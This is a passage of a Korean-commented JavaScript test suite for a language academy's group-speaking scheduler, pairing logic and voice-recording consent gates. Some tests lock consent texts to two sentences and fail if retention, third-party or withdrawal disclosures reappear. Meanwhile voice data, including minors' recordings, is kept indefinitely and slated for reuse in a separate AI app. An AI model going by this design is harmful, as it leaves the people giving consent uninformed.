// tests/발화퀄리티.test.js — [v9.99] 발화 퀄리티 엔진 회귀 테스트
// 실행: node tests/발화퀄리티.test.js  (CI: syntax-check.yml이 tests/*.test.js 전체 구동)
//
// 이 테스트가 지키는 것 = 정원 16명 소그룹 20분의 계약.
//   교실에서 강사 1명이 4조를 동시에 들을 수 없으므로, 여기가 틀리면 아무도 못 잡는다.
//   특히 「선언만 하고 아무도 안 쓰는 상수」 검사는 v9.80이 ROLE_TALK를 선언만 하고
//   어디서도 참조하지 않아 「발화량 추정」이 주석으로만 존재했던 사고(08-01 발견)의 회귀 장치다.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const ROOT = path.resolve(__dirname, '..');
const { engineSource } = require('./_engine-source');
/* 주석 제거 통로는 공용 하나다 — `tests/lib/소스검사.js` (F401 계열 · 대기열 P3 줄73). */
const { 코드만 } = require('./lib/소스검사.js');
const code = engineSource();
/* 🔑 **부정 단언 전용** 정제본 — 「없어야 한다」를 원문에 대고 재면 그 문구를 주석에 적는 순간
 *   가드가 엉뚱하게 빨개진다(대기열 P3 #Q72). 긍정 단언과 구간 앵커는 원문 `code` 를 그대로 본다. */
const 코드정제 = 코드만(code);

function section(startMarker, endMarker) {
  const s = code.indexOf(startMarker);
  assert.notEqual(s, -1, `섹션 시작 표식을 찾지 못함: ${startMarker}`);
  const e = code.indexOf(endMarker, s + startMarker.length);
  assert.notEqual(e, -1, `섹션 끝 표식을 찾지 못함: ${endMarker}`);
  return code.slice(s, e);
}

// 조 편성·발화 상수 + 순수 계산 함수를 실값으로 로드(하드코딩 금지 — 정본이 바뀌면 검사도 함께 움직인다)
function loadCore() {
  const start = code.indexOf('const GROUP_COUNT = 4;');
  const end = code.indexOf('/* --- 실력 점수', start);
  assert.notEqual(start, -1, 'GROUP_COUNT 섹션을 찾지 못함');
  assert.notEqual(end, -1, 'skillScoreOf_ 앞 표식을 찾지 못함');
  const classDowOk_ = (type, dow) => (String(type) === '주말' ? dow === 6 : (dow >= 1 && dow <= 5));
  const Utilities = { formatDate: (d) => d.toISOString().slice(0, 10) };
  return new Function('classDowOk_', 'Utilities', `${code.slice(start, end)}
    return { roleOfSeat_, pairSeatOf_, pairRoundsOf_, focusGroupOf_, lessonDayMap_, lessonNoOf_,
             ROLE_NAMES, ROLE_ICONS, ROLE_TALK, ROLE_DUTY, GROUP_COUNT, SEASON_WEEKS,
             TALK_PLAN_MIN, TALK_ROUNDS, FOCUS_START_WEEK, PAIR_PATTERNS };`)(classDowOk_, Utilities);
}

const G = loadCore();

/* ── ① 3라운드 짝 — 4/3/2 반복의 핵심 계약 ───────────────────────── */

test('4인 조는 3라운드 안에 나머지 셋을 정확히 한 번씩 만난다', () => {
  for (let seat = 0; seat < 4; seat++) {
    const mates = G.pairRoundsOf_(seat, 4);
    assert.equal(mates.length, 3, `좌석 ${seat}의 라운드 수가 3이 아님`);
    // 🚫 `코드만()` 대상 아님 — `mates` 는 `pairRoundsOf_()` 가 **짜 낸 좌석 배열**이지 소스 글이 아니다.
    assert.ok(!mates.includes(seat), `좌석 ${seat}이 자기 자신과 짝이 됨`);
    const uniq = [...new Set(mates)];
    assert.equal(uniq.length, 3, `좌석 ${seat}이 같은 상대를 두 번 만남: ${mates.join(',')}`);
    assert.deepEqual([...mates].sort(), [0, 1, 2, 3].filter((s) => s !== seat),
      `좌석 ${seat}이 만나지 못한 조원이 있음: ${mates.join(',')}`);
  }
});

test('짝은 라운드마다 서로를 가리킨다(A의 짝이 B면 B의 짝도 A)', () => {
  for (let r = 0; r < G.TALK_ROUNDS.length; r++) {
    for (let seat = 0; seat < 4; seat++) {
      const mate = G.pairRoundsOf_(seat, 4)[r];
      assert.equal(G.pairRoundsOf_(mate, 4)[r], seat,
        `${r + 1}R에서 좌석 ${seat}↔${mate} 짝이 비대칭 — 한쪽만 상대가 바뀌면 교실이 엉킨다`);
    }
  }
});

test('3인 조는 짝을 만들지 않는다(셋이 함께)', () => {
  assert.deepEqual(G.pairRoundsOf_(0, 3), [], '3인 조에 짝이 생기면 한 명이 남는다');
  assert.deepEqual(G.pairRoundsOf_(2, 3), []);
});

test('라운드 수와 짝 조합 수가 일치한다 — 한쪽만 늘리면 조용히 라운드가 빈다', () => {
  assert.equal(G.TALK_ROUNDS.length, G.PAIR_PATTERNS.length,
    'TALK_ROUNDS와 PAIR_PATTERNS 길이가 다르다(4라운드로 늘리면 4번째 짝이 없다)');
});

/* ── ② 20분 타임박스 — 물리적으로 가능한 배분인가 ─────────────────── */

test('타임박스 합이 소그룹 20분을 넘지 않는다', () => {
  const sum = G.TALK_PLAN_MIN + G.TALK_ROUNDS.reduce((a, b) => a + b, 0);
  assert.ok(sum <= 20, `계획+라운드 합 ${sum}분 > 20분 — 정리·발표 시간이 사라진다`);
  assert.ok(sum >= 8, `계획+라운드 합 ${sum}분은 너무 짧다 — 20분을 설계 없이 흘려보낸다`);
});

test('라운드 시간은 점점 짧아진다(4/3/2 — 같은 내용을 더 빨리 말하게 하는 설계)', () => {
  for (let i = 1; i < G.TALK_ROUNDS.length; i++) {
    assert.ok(G.TALK_ROUNDS[i] < G.TALK_ROUNDS[i - 1],
      `${i + 1}R이 앞 라운드보다 짧지 않다 — 유창성 압박이 사라진다`);
  }
});

/* ── ③ 역할 의무 — 저발화 역할에도 발화를 심는다 ─────────────────── */

test('역할 의무가 모든 역할에 1:1로 있다', () => {
  assert.equal(G.ROLE_DUTY.length, G.ROLE_NAMES.length,
    '역할과 의무 개수가 다르다 — 브리핑에 undefined가 찍힌다');
  G.ROLE_DUTY.forEach((d, i) => assert.ok(String(d).trim().length > 0,
    `${G.ROLE_NAMES[i]} 역할의 의무가 비어 있다`));
});

test('저발화 역할(가중 1)에도 발화 의무가 붙어 있다', () => {
  G.ROLE_TALK.forEach((w, i) => {
    if (w > 1) return;
    assert.ok(String(G.ROLE_DUTY[i]).trim().length > 0,
      `${G.ROLE_NAMES[i]}(가중 ${w})에 발화 의무가 없다 — 4차시 중 2차시를 침묵으로 보내게 된다`);
  });
});

/* ── ④ 정밀 청취 로테이션 ────────────────────────────────────────── */

test('정밀 청취는 4차시 만에 전 조를 한 번씩 돈다', () => {
  const seen = [];
  for (let n = 1; n <= G.GROUP_COUNT; n++) seen.push(G.focusGroupOf_(n, G.FOCUS_START_WEEK));
  assert.deepEqual([...seen].sort(), [1, 2, 3, 4], `4차시 순환이 깨짐: ${seen.join(',')}`);
});

test('1~2주차에는 정밀 청취를 지정하지 않는다(조 자율 운행 미성숙 구간)', () => {
  for (let w = 1; w < G.FOCUS_START_WEEK; w++) {
    assert.equal(G.focusGroupOf_(5, w), 0, `${w}주차에 정밀 청취가 켜짐 — 나머지 3조가 방치된다`);
  }
  assert.equal(G.focusGroupOf_(0, 8), 0, '시즌 기간 밖(차시 0)인데 정밀 청취가 켜짐');
});

/* ── ⑤ 발화 지수 — 지명 순서를 정하는 계산 ───────────────────────── */

function loadTalkIndex() {
  const src = section('function talkIndexOf_(', '/* [v9.99] 학생용 오늘의 만남');
  const stub = {
    groupBoardOf_: () => null,
    seasonStartOf_: () => new Date(2027, 1, 1),
    scheduleMap: () => ({}),
    schedOf: () => ({ type: '평일' }),
    quietScoreMap_: () => ({}),
    lessonDayMap_: () => ({ D1: 1, D2: 2, D3: 3, D4: 4 }),
    attDayMapCached_: () => ({
      A: { D1: 1, D2: 1, D3: 1, D4: 1 },   // 개근
      B: { D1: 1 },                        // 1차시만 출석
      C: { D1: 1, D2: 1, D3: 1, D4: 1 },   // 개근이지만 미발화 기록 1회
    }),
    ROLE_TALK: G.ROLE_TALK, ROLE_NAMES: G.ROLE_NAMES, roleOfSeat_: G.roleOfSeat_,
  };
  const names = Object.keys(stub);
  return new Function(...names, `${src}\nreturn talkIndexOf_;`)(...names.map((n) => stub[n]));
}

test('발화 지수 = 출석한 차시의 역할 가중 합 — 결석은 그날 역할을 통째로 잃는다', () => {
  const talkIndexOf_ = loadTalkIndex();
  const board = {
    lessonNo: 4,
    groups: [[{ sid: 'A', name: '아', seat: 0 }, { sid: 'B', name: '바', seat: 1 }, { sid: 'C', name: '차', seat: 2 }]],
  };
  const out = talkIndexOf_({}, '평일11A', new Date(2027, 1, 4), 'Asia/Ulaanbaatar', board, { C: 1 });
  const by = {};
  out.forEach((x) => { by[x.sid] = x; });

  // 3인 조라 역할은 앞 3개(진행2·기록1·발표2)만 순환 → 4차시 최대 = 2+1+2+2 = 좌석마다 동일하지 않을 수 있으므로 실측 대조
  assert.equal(by.A.got, by.A.max, '개근인데 획득이 최대와 다르다');
  assert.equal(by.A.pct, 100, '개근·침묵 0인데 100%가 아니다');
  assert.ok(by.B.got < by.B.max, '1차시만 출석했는데 최대치를 받았다');
  assert.ok(by.B.pct < by.A.pct, '결석이 많은 학생이 개근 학생보다 지수가 높다');
  assert.ok(by.C.pct < by.A.pct && by.C.pct > by.B.pct,
    '미발화 기록이 지수에 반영되지 않았다(개근 무침묵보다 낮고 대량 결석보다 높아야 한다)');
  assert.equal(out[0].sid, 'B', '지명 우선 정렬이 낮은 지수부터가 아니다');
});

test('발화 지수는 편성이 없으면 조용히 빈 배열(개원 전 무소음)', () => {
  const talkIndexOf_ = loadTalkIndex();
  assert.deepEqual(talkIndexOf_({}, 'X', new Date(), 'Asia/Ulaanbaatar', null, {}), []);
  assert.deepEqual(talkIndexOf_({}, 'X', new Date(), 'Asia/Ulaanbaatar', { lessonNo: 0, groups: [] }, {}), []);
});

/* ── ⑥ 배선 — 계산이 실제로 강사·학생 화면까지 도달하는가 ────────── */

test('선언만 하고 아무도 안 쓰는 상수가 없다 — v9.80 ROLE_TALK 미배선의 회귀 장치', () => {
  // 주석을 걷어낸 코드에서만 센다(ROLE_TALK는 주석에 여러 번 등장해 그대로 세면 미배선을 못 잡는다)
  /* 🔑 [2026-08-13] 지역 사본 → 공용 통로. 옛 판은 인라인 주석을 «따옴표가 없는 줄»에서만
   *   지웠다(`[^\n'"]`) — 따옴표가 든 줄의 주석은 그대로 남아 ROLE_TALK 를 덧세던 자리다. */
  const bare = 코드만(code);
  ['ROLE_TALK', 'ROLE_DUTY', 'TALK_ROUNDS', 'TALK_PLAN_MIN', 'FOCUS_START_WEEK', 'PAIR_PATTERNS', 'ROLE_ICONS']
    .forEach((n) => {
      const uses = bare.split(new RegExp(`\\b${n}\\b`)).length - 1;
      assert.ok(uses >= 2,
        `${n}이 선언(1회)만 되고 실제로 쓰이지 않는다 — 약속한 기능이 주석으로만 존재한다`);
    });
});

test('20분 프로토콜이 조 편성표가 나가는 모든 경로에 실린다', () => {
  const board = section('function groupBoardText_(', '// 수동 확인용');
  assert.ok(board.includes('talkProtocolLines_'), '강사 브리핑 조 편성표에 20분 프로토콜이 없다');
  assert.ok(board.includes('talkIndexOf_'), '조 편성표에 지명 우선(발화 지수)이 없다');
  assert.ok(board.includes('m.rounds'), '조 편성표 짝이 3라운드로 펴지지 않았다');
  const hud = section('function buildGroupHud_(', 'function groupHudsByClass_(');
  assert.ok(hud.includes('TALK_ROUNDS') && hud.includes('ROLE_DUTY'),
    'Glide 반 상세 HUD에 타임박스·역할 의무가 없다(교실에서 보는 화면)');
  assert.ok(hud.includes('b.focus'), 'HUD에 정밀 청취 조 표시가 없다');
  /* ⚠ **이 조각은 `코드만()` 으로 감싸면 안 된다 — 꼬리가 통째로 눕는다.**
   *   끝 앵커 `[v9.91] 📋 차시 마감폼` 이 주석 배너 «안»이라 조각이 미종료 `/*` 로 끝나고,
   *   그러면 `소스검사.js:102~107` 의 `끝===-1` 가지가 그 자리부터 끝까지를 줄바꿈으로 눕힌다
   *   (실측 3698자 → 3537자). 아래 둘은 **긍정** 단언이라 지금은 무해하지만, 여기에 부정 단언을
   *   붙이며 감싸면 «공허참»이 된다 — 적색이 아니라 초록으로 샌다. 감싸려거든 끝 앵커부터 코드 심볼로. */
  const plan = section('function lessonPlanFill_(', '[v9.91] 📋 차시 마감폼');
  assert.ok(plan.includes('TALK_ROUNDS') && plan.includes('ROLE_DUTY'), '주간 교안에 20분 타임박스가 없다');
  assert.ok(plan.includes('o.talkReal'), '교안 §12 지명 계획이 발화 실측으로 승격되지 않았다');
});

test('학생 화면 오늘의만남(DY129) 배선 — 행 수 정합·수업 없는 날 공란', () => {
  assert.ok(code.includes("pf.getRange('DY1').setValue('오늘의만남')"), 'DY129 헤더 보장이 없다');
  assert.ok(code.includes('writeIfChanged(pf, 2, 129, meetOut)'), 'DY129 기입이 없다 — 이 검사·레지스트리 갱신 필요');
  assert.ok(code.includes('meetOut.push('), 'meetOut이 학생 루프에서 채워지지 않는다(행 수 어긋남 = 열 전체 밀림)');
  const fn = section('function todayPairsBySid_(', '/* [v9.99] 강사가 매 차시 보는');
  assert.ok(fn.includes('classDowOk_'), '수업 없는 날 가드가 없다 — 어제 짝이 남아 오정보가 된다');
  assert.ok(fn.includes('pairRoundsOf_'), '학생 화면 짝이 조 편성표와 다른 계산을 쓴다');
});

test('DY129 점거 가드 — 남의 헤더를 덮지 않는다(열 충돌 사고 2건의 회귀 장치)', () => {
  const s = code.indexOf('⚠ 점거 가드(v9.84와 같은 계급)');
  assert.notEqual(s, -1, 'DY129 점거 가드가 없다 — 헤더만 갈아끼우면 그 열의 실데이터가 통째로 밀린다');
  const blk = code.slice(s, s + 1600);
  assert.ok(/dyCur && dyCur !== '오늘의만남'/.test(blk), '남의 헤더 판정 분기가 없다');
  // 충돌 분기 안에 기입이 있으면 가드가 무의미해진다 — 기입은 else(정상) 쪽에만 있어야 한다
  const clash = blk.slice(blk.indexOf("dyCur && dyCur !== '오늘의만남'"), blk.indexOf('} else {'));
  const 충돌코드 = 코드만(clash); // 부정 단언 전용
  assert.ok(!충돌코드.includes('writeIfChanged'), '충돌 상태인데도 기입한다 — 가드가 무력');
  assert.ok(!충돌코드.includes("setValue('오늘의만남')"), '충돌 상태인데 헤더를 덮어쓴다');
  assert.ok(blk.includes("setState(stDY, '만남열충돌', '')"), '충돌 해소 시 재무장이 없다 — 다음 사고에 침묵한다');
});

/* ── ⑦ 미리보기 — 개원 전에 실물을 확인할 수 있는가 ─────────────── */

function loadPreview() {
  const s = code.indexOf('const GROUP_COUNT = 4;');
  const e = code.indexOf('/* --- 실력 점수', s);
  const s2 = code.indexOf('function groupBoardRender_(');
  const e2 = code.indexOf('// 수동 확인용', s2);
  assert.ok(s2 !== -1 && e2 !== -1, 'groupBoardRender_ 섹션을 찾지 못함');
  const classDowOk_ = (t, d) => (String(t) === '주말' ? d === 6 : (d >= 1 && d <= 5));
  return new Function('classDowOk_', 'Logger',
    `${code.slice(s, e)}${code.slice(s2, e2)}\nreturn groupBoardPreview;`)(classDowOk_, { log: () => {} });
}

test('미리보기는 시트를 전혀 건드리지 않는다(개원 전 확인용)', () => {
  const s2 = code.indexOf('function groupBoardPreview()');
  const body = code.slice(s2, code.indexOf('// 수동 확인용', s2));
  const 미리보기코드 = 코드만(body); // 부정 단언 전용 — 루프 안에서 감싸면 낱말 수만큼 다시 렉싱된다
  ['SpreadsheetApp', 'getSheetByName', 'setValue', 'writeIfChanged'].forEach((bad) => {
    assert.ok(!미리보기코드.includes(bad), `미리보기가 ${bad}를 쓴다 — 확인용 함수가 실데이터를 만지면 안 된다`);
  });
});

test('미리보기와 실물은 같은 렌더러를 탄다(두 벌이 되면 갈라진다)', () => {
  const prev = code.slice(code.indexOf('function groupBoardPreview()'), code.indexOf('// 수동 확인용'));
  assert.ok(prev.includes('groupBoardRender_('), '미리보기가 자체 문자열을 조립한다 — 실물과 갈라진다');
  const real = section('function groupBoardText_(', '/* [v9.103] 조 편성표 렌더');
  assert.ok(real.includes('groupBoardRender_('), '실물이 렌더러를 안 쓴다');
});

test('미리보기 출력에 강사가 볼 5요소가 전부 있다', () => {
  const out = loadPreview()();
  ['조 편성', '짝 1R', '2R', '3R', '오늘 발표', '소그룹 20분', '역할 의무', '정밀 청취', '지명 우선', '오늘 세 번 만나요']
    .forEach((k) => assert.ok(out.includes(k), `미리보기에 「${k}」가 없다`));
  assert.ok(/🎧 오늘 정밀 청취 = [1-4]조/.test(out), '정밀 청취 조가 지정되지 않았다(3주차 예시여야 한다)');
  assert.ok(out.split('짝 1R').length - 1 === 4, '4개 조 전부에 3라운드 짝이 찍히지 않았다');
});

/* ── ⑧ 음성 동의 — 보관 1년(유호 08-01 확정)이 학생이 읽는 문장까지 닿는가 ── */

test('음성 보관은 무기한 단일 소스이고 구 기간 문구가 코드에 남아 있지 않다', () => {
  assert.ok(/const VOICE_RETENTION_MONTHS = 0/.test(code), 'VOICE_RETENTION_MONTHS = 0(무기한) 상수가 없다');
  assert.ok(!코드정제.includes('졸업 후 3년'), '구 보관 문구(졸업 후 3년)가 코드에 남아 있다');
  assert.ok(!코드정제.includes('녹음일로부터 1년'), '구 1년 문구가 남아 있다');
  /* 🔴 **[v19.0] 문구 쪽 검사는 여기서 뺐다.** 보관 기간·철회 안내는 유호님 확정(D7)으로
   *   동의문에서 **지운 것**이고, 이 검사가 그대로면 「지운 것을 도로 넣어라」가 된다.
   *   보관 정책 자체는 위 상수(코드 층)가 계속 지킨다 — 문장 층은 아래 D7 검사가 진다. */
});

/* [v9.138] 동의 범위 확장 — 「2년 축적 → AI 회화 앱」의 법적 전제.
 *   구 문구는 용도가 학원 운영으로만 한정돼 있어, 회화 앱을 별도 제품·법인으로 내면 2년치를 통째로 못 썼다.
 *   동의는 **소급이 불가능**하므로(첫 실학생 서명으로 굳는다) 이 검사가 지키는 것은 코드가 아니라 개원 일정이다.
 *   조각이 아니라 **조립된 문장**을 만들어 검사한다 — 학생이 읽는 것은 조각이 아니다. */
function loadConsentTexts() {
  const s = code.indexOf("const CONSENT_EXT_HEADERS = ['음성동의'];");
  assert.notEqual(s, -1, '동의 상수 구역 시작을 찾지 못함');
  const e = code.indexOf('function migrateConsentV186()', s);
  assert.notEqual(e, -1, '동의 상수 구역 끝(migrateConsentV186)을 찾지 못함');
  return new Function(`${code.slice(s, e)}
    return { VOICE_CONSENT_HELP, CONSULT_CONSENT_HELP, CONSENT_SERVICE_SCOPE, CONSENT_DEIDENT,
             CONSENT_MN_APPROVED, CONSENT_HELP_A_MN, CONSENT_HELP_B_MN, CONSENT_VERSION, 동의문구_ };`)();
}

/* [v19.0 · 2026-08-07 유호님 확정 D7] **검사를 반대로 뒤집었다.**
 *   v9.138 은 「범위·비식별·제3자·철회가 조립 결과에 있는가」를 지켰다. 그 조항들은
 *   유호님이 두 갈래를 보고 **직접 지우기로 고르셨다** — 검사를 그대로 두면 그건
 *   「지운 것을 도로 넣어라」이고, 다음 사람은 유호님 결정을 되돌리는 쪽으로 끌려간다.
 * 🔑 그래서 이제 지키는 것은 **두 문장뿐이라는 것** 자체다. 열거가 되살아나면 빨개진다. */
test('[v19.0] 동의 문구 두 벌 모두 — 유호님 확정 두 문장뿐이다(열거가 되살아나지 않았다)', () => {
  const C = loadConsentTexts();
  [['A(개인정보)', C.CONSULT_CONSENT_HELP], ['B(음성)', C.VOICE_CONSENT_HELP]].forEach(([label, help]) => {
    assert.ok(help.includes('여러분 한 사람 한 사람에게 맞추는 데 씁니다'),
      `동의 ${label}에 유호님 확정 첫 문장이 없다`);
    assert.ok(help.includes('여러분의 목소리로 배워서 여러분을 고쳐 주는 방식입니다'),
      `동의 ${label}에 유호님 확정 둘째 문장이 없다`);
    // 주어 — 학원 창구다. 앱 문구(「이 앱은」)를 그대로 옮기면 크루가 무엇에 동의하는지 헷갈린다
    assert.ok(!/이 앱은/.test(help), `동의 ${label}에 앱 문구가 섞였다 — 여기 주어는 SYNK LAB 이다`);
    // 지운 것이 되살아나지 않았는가 (되살리려면 유호님 판정이 먼저다)
    for (const 옛조각 of ['수집:', '보관:', '제3자', '철회', '관계·승계 사업체']) {
      assert.ok(!help.includes(옛조각),
        `동의 ${label}에 「${옛조각}」이 되살아났다 — D7 은 두 문장만이다. 되돌리려면 유호님 판정이 먼저다`);
    }
  });
});

test('[v9.138] 몽골어 병기 — 검수 게이트가 기본 잠금이고, 켜면 실제로 두 언어가 실린다', () => {
  const C = loadConsentTexts();
  // 번역은 AI 초안이다. 검수 전에 라이브 폼에 실리면, 틀린 문장으로 받은 동의가 되어 없느니만 못하다
  assert.equal(C.CONSENT_MN_APPROVED, false,
    'CONSENT_MN_APPROVED가 true다 — 원어민·법률 검수를 마쳤다면 이 테스트의 기대값도 함께 바꿔야 한다(무심코 켜지는 것을 막는 자물쇠)');
  // 게이트가 꺼진 동안은 구 동작과 바이트 동일이어야 한다(병기 도입이 기존 문구를 흔들면 안 된다)
  assert.equal(C.동의문구_('한국어만', 'МОНГОЛ'), '한국어만', '게이트가 꺼졌는데 몽골어가 실린다');
  assert.equal(C.동의문구_(C.VOICE_CONSENT_HELP, C.CONSENT_HELP_B_MN), C.VOICE_CONSENT_HELP, '게이트 잠금 중인데 음성 문구가 변형됐다');
  // 켰을 때 실제로 병기되는지 — 게이트만 있고 배선이 없는 상태(v9.90의 '약속은 주석에, 배선은 없음')를 막는다
  const 켠결과 = new Function(`const CONSENT_MN_APPROVED = true;
    ${code.slice(code.indexOf('function 동의문구_('), code.indexOf('\n}', code.indexOf('function 동의문구_(')) + 2)}
    return 동의문구_('KO본문', 'MN본문');`)();
  assert.ok(켠결과.includes('KO본문') && 켠결과.includes('MN본문'),
    '게이트를 켜도 두 언어가 함께 실리지 않는다 — 게이트만 있고 배선이 없다');
  assert.ok(켠결과.includes('Монгол хэл'), '병기 구분 머리말이 없다 — 학생이 어느 문단이 자기 언어인지 못 찾는다');
  /* 🔴 **[v19.0] 몽골어 초안은 비어 있는 것이 맞다.** 여기 있던 번역은 D7 이 지운 열거문을
   *   옮긴 것이라, 남겨 두면 게이트를 켜는 날 **한국어와 다른 뜻**이 라이브 폼에 선다.
   *   그래서 검사를 뒤집는다 — 「비었나」가 아니라 「옛 열거 번역이 되살아나지 않았나」.
   *   🔑 채우는 날은 게이트를 켜는 날과 같다: 새 두 문장의 원어민 검수본 + `몽골어대조.js`.
   *   그때 이 검사도 함께 바꾼다(그게 자물쇠다 — 무심코 켜지지 않게). */
  [['A', C.CONSENT_HELP_A_MN], ['B', C.CONSENT_HELP_B_MN]].forEach(([lb, mn]) => {
    assert.ok(!/залгамжлагч|Хадгалах хугацаа|цуцлах/.test(mn || ''),
      `몽골어 ${lb} 에 D7 이 지운 열거문의 번역이 남아 있다 — 게이트를 켜는 날 한국어와 다른 뜻이 나간다`);
  });
});

test('음성 동의 게이트 — 동의 확인 없이는 녹음이 적재되지 않는다', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const s = tb.indexOf('function voiceSweep_(');
  const sweep = tb.slice(s, tb.indexOf('function writeVoiceLinks_(', s));
  assert.ok(sweep.includes('voiceConsentMap_'), 'voiceSweep_에 동의 게이트가 없다 — v9.90이 약속한 배선');
  assert.ok(/state !== 'yes'/.test(sweep), "'동의' 이외를 통과시킨다 — 거부·미응답이 함께 삼켜진다");
  // 판정 불가(맵 null)를 통과로 바꾸면 게이트가 침묵으로 열린다 — 보류가 기본값이어야 한다
  assert.ok(/const state = consent \? \(consent\[sid\] \|\| ''\) : null/.test(sweep),
    '동의 맵을 못 읽었을 때 보류로 떨어지지 않는다');
  // 게이트는 적재·포인트보다 앞이어야 한다(뒤면 이미 저장된 뒤 막는 셈)
  const gate = sweep.indexOf("state !== 'yes'");
  ['vOut.push(', 'pOut.push('].forEach((after) =>
    assert.ok(sweep.indexOf(after) > gate, `게이트가 ${after}보다 뒤에 있다 — 이미 처리된 뒤 막힌다`));
  /* [v9.156] 구 검사는 `setSharing(`도 순서 목록에 넣었다(공유 전환이 게이트 뒤인지). 이제 그 호출이
   * **아예 없어야 한다** — 유호님 08-04 「B로 가자」 결정으로 미성년 녹음의 공개 전환을 폐지했다.
   * 순서 검사를 부재 검사로 바꾼다: 순서만 보면 「게이트 뒤에서 다시 공개로 여는」 코드를 통과시킨다. */
  const sweepCode = 코드만(sweep);
  assert.ok(!/setSharing/.test(sweepCode),
    'voiceSweep_가 녹음을 공개로 전환한다 — 미성년 목소리가 링크만으로 열린다(v9.156에서 폐지한 경로)');
  assert.ok(sweep.includes('held.length') && sweep.includes('adminMail'),
    '보류를 통지하지 않는다 — 학생 쪽에서 "왜 반영이 안 되지"가 미스터리로 남는다');
  assert.ok(!/DriveApp[\s\S]{0,80}remove|setTrashed/.test(코드만(sweep)),
    '보류분을 자동 삭제한다 — 오판이면 복구 불가이고 종이 동의서 학생일 수 있다');
});

/* [v9.190] 미션ID — 발음 데이터의 과업 축(유호님 승인 08-06). 두 가지가 소급 불가라 여기서 못박는다:
 *   ① 안 받은 미션ID는 영원히 없다  ② 잘못된 열에서 받은 값은 「받았는데 틀린」 데이터라 더 나쁘다. */
test('미션ID 열 판별 — 「미션ID」가 「미션」을 품는다는 것을 실제로 돌려서 확인한다', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const s = tb.indexOf('const cSid = head.findIndex');
  assert.notEqual(s, -1, 'voiceSweep_ 열 판별부를 찾지 못함');
  const e = tb.indexOf('\n', tb.indexOf('const cFile = head.findIndex', s));
  // 문자열 검사가 아니라 **실제 소스를 실행**한다 — 정규식만 보면 로직이 바뀌어도 통과한다
  const pick = new Function('head', tb.slice(s, e) + '\n return { cSid, cMission, cMissionId, cFile };');

  const 정상 = pick(['타임스탬프', '학생ID', '미션', '녹음 파일 업로드', '미션ID']);
  assert.equal(정상.cMission, 2, '정상 순서에서 미션 열을 못 찾는다');
  assert.equal(정상.cMissionId, 4, '정상 순서에서 미션ID 열을 못 찾는다');

  /* 핵심 — 폼 문항 순서를 유호님이 바꾸면 이 배치가 온다. 순진한 indexOf('미션')은 여기서
   * 미션ID 열을 '미션'으로 집어 자유문자열 칸에 ID를 싣는다(예외 없이 조용한 오적재). */
  const 역순 = pick(['타임스탬프', '학생ID', '미션ID', '미션', '녹음 파일 업로드']);
  assert.equal(역순.cMissionId, 2, '역순에서 미션ID를 못 찾는다');
  assert.equal(역순.cMission, 3, '역순에서 미션ID 열을 「미션」으로 오인한다 — 자유문자열 칸에 ID가 실린다');

  // 마이그레이션 전 구 폼(3문항)도 그대로 살아야 한다 — 미션ID 없음 = -1, 미션은 정상
  const 구폼 = pick(['타임스탬프', '학생ID', '미션', '녹음 파일 업로드']);
  assert.equal(구폼.cMissionId, -1, '구 폼에서 없는 미션ID가 잡힌다');
  assert.equal(구폼.cMission, 2, '구 폼의 미션 열 판별이 깨졌다 — 마이그레이션 전 응답이 유실된다');
});

test('미션ID 증분은 멱등이고, 이미 뿌려진 학생별 링크를 죽이지 않는다', () => {
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  const s = tb.indexOf('function migrateVoiceFormMissionId()');
  assert.notEqual(s, -1, '미션ID 증분 함수가 없다');
  const fn = tb.slice(s, tb.indexOf('\n}\n', s));

  // 필수로 만들면 이 문항이 없는 구 프리필 링크로 들어온 학생이 제출을 못 한다(숙제폼 v9.138과 같은 계급)
  assert.ok(/setTitle\('미션ID'\)\s*\.setRequired\(false\)/.test(fn), '미션ID가 선택 응답이 아니다 — 구 링크로 들어온 학생이 제출을 못 한다');
  // 멱등 — 야간 배치가 매일 부르므로 가드가 없으면 문항이 매일 하나씩 늘어난다
  assert.ok(/if \(!had\)/.test(fn) && /indexOf\('미션ID'\) > -1/.test(fn), '멱등 가드가 없다 — 야간 배치가 매일 문항을 하나씩 추가한다');
  // profiles DB열에 이미 뿌려진 학생별 링크가 죽으면 안 된다 → 기존 키를 덮지 않고 별도 키로 낸다
  assert.ok(!/setState\(st, '목소리폼URL틀'/.test(코드만(fn)), "기존 '목소리폼URL틀'을 덮어쓴다 — profiles에 이미 뿌려진 학생별 링크가 죽는다");
  assert.ok(/setState\(st, '목소리폼미션틀'/.test(fn), '미션별 링크 틀을 별도 키로 내지 않는다');
  // 틀은 문항이 생긴 **뒤에** 뽑아야 프리필 자리가 잡힌다
  assert.ok(fn.indexOf("addTextItem().setTitle('미션ID')") < fn.indexOf("setState(st, '목소리폼미션틀'"),
    'URL 틀 생성이 문항 추가보다 앞이다 — 프리필 자리가 안 잡힌 틀이 저장된다');
  // 이미 있을 때 침묵해야 한다 — 매일 같은 메일이 오면 알림이 아니라 소음이고, 진짜 알림이 묻힌다
  assert.ok(/if \(had\) return ''/.test(fn), '이미 적용된 뒤에도 매일 메일을 보낸다');

  // 클릭 0회 경로 — 야간 배치가 부르되 **스위프보다 앞**이어야 그날 응답부터 열을 읽는다
  const nightly = tb.slice(tb.indexOf('function 교재연동Nightly()'), tb.indexOf('// ── A-1.'));
  assert.ok(nightly.includes('migrateVoiceFormMissionId'), '야간 배치가 부르지 않는다 — 클릭 없이는 영원히 적용 안 된다');
  assert.ok(nightly.indexOf('migrateVoiceFormMissionId') < nightly.indexOf('voiceSweep_'),
    '증분이 스위프보다 뒤다 — 그날 응답은 미션ID 열 없이 적재된다');

  // [v9.208] 「맨 끝」→「고정 11번째」 — 지키려는 불변식은 처음부터 「앞에 끼우지 않는다」다(앞을 읽는 소비처:
  //   전사 7~9열·삭제 6열·점검 8열). schema_ver 가 규약(새 열은 끝에만)대로 붙자 「끝」은 위치의 증거가 아니게 됐다
  //   — 소급성 ④ audio_ref·수집 quiz/hw 와 같은 처방(구간을 닫는다).
  const hdr = tb.match(/const VOICE_LOG_HEADERS = \[([^\]]+)\]/)[1].split(',').map(x => x.trim().replace(/'/g, ''));
  assert.equal(hdr[10], '미션ID', '미션ID가 11번째(고정 위치)가 아니다 — 앞을 고정 인덱스로 읽는 소비처가 통째로 밀린다');
